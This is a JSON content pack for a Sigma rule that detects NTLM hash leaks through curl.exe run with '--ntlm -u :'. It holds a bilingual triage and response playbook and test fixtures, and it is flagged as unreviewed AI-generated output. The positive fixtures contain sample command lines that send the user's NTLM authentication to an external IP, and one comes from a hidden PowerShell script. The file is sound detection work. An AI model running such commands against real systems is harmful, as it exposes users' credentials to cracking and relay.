@@ -1,0 +1,142 @@
+{
+  "rule": {
+    "id": "916eb839-895e-47f8-99ee-3008bf377a3e",
+    "title": "NTLM Hash Leak Via Curl NTLM Authentication",
+    "level": "high",
+    "status": "test",
+    "author": "Swachchhanda Shrawan Poudel (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_curl_ntlm_hash_leak_attempt.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_curl_ntlm_hash_leak_attempt.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1187"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó curl.exe con autenticación NTLM (--ntlm) y credenciales vacías (-u :). Esto obliga a Windows SSPI a usar la sesión del usuario actual y puede filtrar su respuesta NTLMv2 a un servidor controlado por un atacante.",
+      "what_it_detects": "Procesos curl.exe (por Image u OriginalFileName, incluso renombrados) cuyo CommandLine contiene --ntlm y un argumento -u o --user seguido directamente de ':', es decir, sin usuario ni contraseña.",
+      "why_it_matters": "El curl incluido por Microsoft desde Windows 10 / Server 2019 usa SSPI, que con una identidad NULL toma las credenciales de la sesión en LSASS. El servidor remoto recibe el challenge-response NTLMv2 del usuario y puede crackearlo offline o retransmitirlo (relay). Corresponde a ATT&CK T1187, Forced Authentication.",
+      "triage_steps": [
+        "Revise el CommandLine completo: identifique la URL, el host y el puerto de destino, y determine si es interno, conocido o externo.",
+        "Valide el destino con reputación, inventario de activos y DNS. Un destino en Internet o en una IP desconocida de la red interna es una señal fuerte.",
+        "Analice ParentImage y ParentCommandLine: ¿lo lanzó un script de administración conocido, una tarea programada, Office, PowerShell o cmd interactivo?",
+        "Identifique al usuario que ejecutó el proceso y su nivel de privilegio. Una cuenta privilegiada aumenta mucho el impacto.",
+        "Correlacione la telemetría de red del endpoint para confirmar si hubo conexión exitosa al destino y si se intercambió autenticación NTLM.",
+        "Pivote en el mismo host ±15 minutos: descargas, scripts nuevos, persistencia u otras alertas de acceso a credenciales.",
+        "Busque eventos 4624/4625 con NTLM originados desde la IP de destino usando la cuenta del usuario, lo que indicaría un relay.",
+        "Busque el mismo destino o patrón de CommandLine en otros hosts del entorno."
+      ],
+      "false_positives": [
+        "Scripts o tareas de automatización que se autentican con NTLM ante un proxy o servicio interno usando la sesión actual del usuario.",
+        "Pruebas de conectividad o diagnóstico realizadas por administradores contra intranets con autenticación integrada de Windows.",
+        "Ejercicios autorizados de red team o pentest; confirme con el ticket o el responsable."
+      ],
+      "response_steps": [
+        "Verifique con el usuario y el dueño del sistema si la ejecución era esperada y si el destino es legítimo.",
+        "Si no es legítima, bloquee el destino en proxy y firewall y aísle el endpoint si hay otros indicios de compromiso.",
+        "Considere expuesto el hash NTLM: restablezca la contraseña del usuario, con prioridad si es una cuenta privilegiada, e invalide sus sesiones.",
+        "Investigue y elimine el script, la tarea o el payload que lanzó curl, y revise la persistencia.",
+        "Restrinja el tráfico NTLM saliente con políticas de grupo y limite el egress SMB/HTTP hacia destinos no autorizados."
+      ],
+      "severity_rationale": "Es alta porque la combinación de --ntlm con credenciales vacías rara vez es legítima y expone directamente material de autenticación reutilizable del usuario."
+    },
+    "en": {
+      "summary": "curl.exe ran with NTLM authentication (--ntlm) and empty credentials (-u :). This makes Windows SSPI use the current logon session and can leak the user's NTLMv2 response to an attacker-controlled server.",
+      "what_it_detects": "curl.exe processes (matched by Image or OriginalFileName, so renamed copies are caught too) whose CommandLine contains --ntlm and a -u or --user argument followed directly by ':', meaning no username or password.",
+      "why_it_matters": "The Microsoft-shipped curl (Windows 10 / Server 2019 and later) uses SSPI. When it gets a NULL identity, SSPI falls back to the session credentials held in LSASS. The remote server receives the user's NTLMv2 challenge-response and can crack it offline or relay it. This maps to ATT&CK T1187, Forced Authentication.",
+      "triage_steps": [
+        "Read the full CommandLine: find the target URL, host and port, and decide whether the destination is internal, known or external.",
+        "Check the destination against reputation data, the asset inventory and DNS. An internet host or an unknown internal IP is a strong signal.",
+        "Review ParentImage and ParentCommandLine: was it a known admin script, a scheduled task, Office, PowerShell or an interactive cmd?",
+        "Identify the executing user and their privileges. A privileged account greatly increases the impact.",
+        "Use endpoint network telemetry to confirm whether the connection succeeded and whether an NTLM exchange took place.",
+        "Pivot on the same host within +/- 15 minutes: downloads, new scripts, persistence or other credential-access alerts.",
+        "Look for NTLM 4624/4625 events from the destination IP using this user's account, which would indicate relay.",
+        "Search other hosts for the same destination or CommandLine pattern."
+      ],
+      "false_positives": [
+        "Automation scripts or tasks that authenticate to an internal proxy or service with NTLM using the current user's session.",
+        "Admin connectivity or diagnostic tests against intranet sites that use Windows integrated authentication.",
+        "Authorized red team or penetration test activity; confirm with the ticket or the owner."
+      ],
+      "response_steps": [
+        "Check with the user and system owner whether the run was expected and the destination is legitimate.",
+        "If it is not legitimate, block the destination at the proxy and firewall, and isolate the endpoint if there are other signs of compromise.",
+        "Treat the NTLM hash as exposed: reset the user's password, starting with privileged accounts, and revoke their sessions.",
+        "Investigate and remove the script, task or payload that launched curl, and check for persistence.",
+        "Restrict outgoing NTLM traffic through Group Policy and limit SMB/HTTP egress to unapproved destinations."
+      ],
+      "severity_rationale": "High fits because --ntlm with empty credentials is rarely legitimate and directly exposes the user's reusable authentication material."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "System curl.exe sending NTLM with empty credentials to an external IP",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\curl.exe",
+          "OriginalFileName": "curl.exe",
+          "CommandLine": "curl.exe --ntlm -u : http://203.0.113.10/share/report.docx",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c update.bat",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "Renamed curl identified by OriginalFileName, using --user : and silent output",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Users\\Public\\c.exe",
+          "OriginalFileName": "curl.exe",
+          "CommandLine": "c.exe -s --ntlm --user : -o NUL http://files.example.com:8080/",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentCommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -File C:\\Users\\Public\\s.ps1",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "curl with NTLM and an explicit service account, so credentials are not empty",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-APP-03.andes.example.com",
+          "User": "ANDES\\svc_monitor",
+          "Image": "C:\\Windows\\System32\\curl.exe",
+          "OriginalFileName": "curl.exe",
+          "CommandLine": "curl.exe --ntlm -u svc_monitor:PLACEHOLDER https://intranet.example.com/health",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+          "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule",
+          "IntegrityLevel": "High"
+        }
+      },
+      {
+        "description": "Ordinary curl download with no NTLM and no credentials",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\curl.exe",
+          "OriginalFileName": "curl.exe",
+          "CommandLine": "curl.exe -L -o C:\\Temp\\tool.zip https://downloads.example.org/tool.zip",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
